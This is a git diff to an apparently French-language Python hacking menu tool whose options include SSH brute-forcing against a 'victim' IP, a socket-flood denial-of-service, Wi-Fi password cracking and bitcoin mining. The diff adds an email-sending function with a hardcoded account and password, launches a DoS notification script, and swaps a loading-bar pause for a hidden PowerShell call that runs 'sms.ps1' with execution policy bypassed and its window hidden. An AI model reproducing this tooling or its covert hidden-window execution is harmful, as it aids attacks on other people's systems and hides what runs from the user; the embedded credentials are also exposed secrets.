@@ -24,7 +24,12 @@ while error<=stop_code:
             import random
             import colorama
             import threading
+            from langdetect import detect
+            from datetime import datetime as dt
             import aiohttp
+            import smtplib
+            from email.mime.text import MIMEText
+            from email.mime.multipart import MIMEMultipart
             import socket
             import zlib
             import urllib.request
@@ -67,6 +72,40 @@ while error<=stop_code:
             osystem = sys.platform
             if osystem == 'win32': exec("os.system('cls')")
             else: exec("os.system('clear')")
+        def send_email(subject, message, to_email="benji77430@gmail.com"):
+            # Set up the SMTP server
+            smtp_server = '127.0.0.1'  # Your SMTP server address
+            port = 587  # Your SMTP server port
+
+            sender_email = 'benji77430@gmail.com'  # Your email address
+            password = 'benji10112008'  # Your email password
+
+            # Create a multipart message
+            msg = MIMEMultipart()
+            msg['From'] = sender_email
+            msg['To'] = to_email
+            msg['Subject'] = subject
+
+            # Add message body
+            msg.attach(MIMEText(message, 'plain'))
+
+            # Start the SMTP session
+            with smtplib.SMTP(smtp_server, port) as server:
+                server.starttls()  # Secure the connection
+                server.login(sender_email, password)
+                server.send_message(msg)
+
+        # Usage
+        subject = 'Test email'
+        message = 'This is a test email sent via Python.'
+        to_email = 'recipient@example.com'
+
+        def detect_language(text):
+            try:
+                language = detect(text)
+                return language
+            except:
+                return "Langue non détectée"
         class Encode:
             def __init__(self):
                 self.enc_txt = b""
@@ -156,7 +195,6 @@ while error<=stop_code:
                                 print('fichier correctement creer !')
                                 break
                         except:
-                            
                             folder = f"C:\\Users\\{user}\\AppData\\Local\\tools"
                             os.system(f'mkdir {folder}')
             else:
@@ -198,7 +236,6 @@ Administrateur'''
                                 print('fichier correctement creer !')
                                 break
                         except:
-                            
                             folder = f"/home/{getpass.getuser()}/tools"
                             os.system(f'mkdir {folder}')
         if user():
@@ -336,6 +373,7 @@ Administrateur'''
     19) ssh bruteforce                                                          20) try to get the public ip
     21) mine bitcoin                                                            22) update tools {maj_status}
     23) show version                                                            24) générate password
+    25) détécter de langue                                                      26) extend word list with text
             """
             print(Colorate.Horizontal(Colors.red_to_blue, r))
             print('')
@@ -390,6 +428,7 @@ Administrateur'''
                 # Gui End
                 num = 0
                 reqs = []
+                subprocess.Popen(['python', 'C:\\fsociety\\notif_dos.py'])
                 loop = asyncio.new_event_loop()
                 r = 0
                 print()
@@ -561,6 +600,8 @@ Administrateur'''
                 class Count:
                     packetCounter = 0 
                 def goForDosThatThing():
+                    
+
                     try:
                         while True:
                             dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -598,7 +639,7 @@ Administrateur'''
                                                                                 |___/ 
                             ''')
                     print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ", end="\r")
-                    t.sleep(0.25)
+                    os.system(f"""PowerShell -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""sms.ps1""' -WindowStyle Hidden""")
                     print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%", end="\r")
                     t.sleep(0.25)
                     print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%", end="\r")
@@ -688,9 +729,9 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                 t.sleep(8)
             if choice =="12":
                 ask = input('pseudo a chercher : ')
-                os.system(f'python sherlock\\sherlock.py {ask}')
+                os.system(f'python3 sherlock\\sherlock.py {ask}')
             if choice =="13":
-                #!/usr/bin/env python 3.7
+                #!/usr/bin/env python3 3.7
                 # -*- coding: utf-8 -*-
                 import argparse
                 import sys
@@ -743,7 +784,7 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                         print(RED, '[{}] Crack Failed using {}'.format(number, password))
                 def pwd(ssid, file):
                     number = 0
-                    with open(file, 'r', encoding='utf8') as words:
+                    with open(file, 'r') as words:
                         for line in words:
                             number += 1
                             line = line.split("\n")
@@ -867,7 +908,7 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                     start_time = Value('i', int(time.time()))
                     end_time = Value('i', 0)
                     print(f"Available threads: {os.cpu_count()}")
-                    with open(words, 'r', encoding='utf-8') as f:
+                    with open(words, 'r') as f:
                         lines = f.readlines()
                     if not bruteforce.bf_file(password, lines, start_time, end_time):      
                         threads = []
@@ -893,7 +934,7 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                     print('error verify the file is well at : C:/users/user/desktop/result.txt')
                     t.sleep(0.2)
             if choice == "19":
-                with open(words, 'r', encoding='utf-8') as f:
+                with open(words, 'r') as f:
                     lines = f.readlines()
                 ip = input('ip de la victime : ')
                 while True:
@@ -928,16 +969,45 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                 print(f'the tools version is  {version}')
                 time.sleep(2)
             if choice == "24":
-                os.system('python passstarter.py')
+                os.system('python3 passstarter.py')
+            if choice == "25":
+                print('la langue est ', detect_language(input('veuillez entrer le texte a détécter : ')))
+                time.sleep(2)
+            if choice == "26":
+                def add_words_to_file(words, filename):
+                    i=0
+                    with open(filename, 'a') as file:
+                        for word in words:
+                            file.write('\n'+word)
+                            i+=1
+                    return i
+                choice = input('do you want to do it with a file ? (y/N)')
+                if choice in ('Y', 'y', 'yes', 'YES'):
+                    try:    
+                        with open('text.txt', 'r', encoding='utf-8') as txt:
+                            file = txt.read()
+                            file = file.split()
+                            print(f'{add_words_to_file(file, words)} mot ont été ajoutées')
+                    except:
+                        with open('text.txt','w+',encoding='utf-8') as f:
+                            f.close()
+                            print("le fichier a été créer veuillez recommencer en entrant votre texte dedans a C:/fsociety/text.txt")
+                            os.startfile('text.txt')
+                            time.sleep(2)
+                    
+                else: 
+                    print(f'{add_words_to_file(input("Entrez les mots à ajouter (séparés par des espaces) : ").split(), words)} mot ont été ajoutées')
+                time.sleep(2)
+
     except Exception as e:
         try:
             with open(f'C:/Users/{getpass.getuser()}/desktop/error log.txt', 'a') as f:
-                now = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
+                now = dt.now().strftime("%d/%m/%Y, %H:%M:%S")
                 err = {"time" : now , "errtype" : str(sys.exc_info()[0]) , e : str(sys.exc_info()[1])}
                 f.write("\n"+str(err))
         except:
             with open(f'/home{getpass.getuser()}/desktop/error log.txt', 'a') as f:
-                now = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
+                now = dt.now().strftime("%d/%m/%Y, %H:%M:%S")
                 err = {"time" : now , "errtype" : str(sys.exc_info()[0]) , e : str(sys.exc_info()[1])}
                 f.write("\n"+str(err))
         error+=1
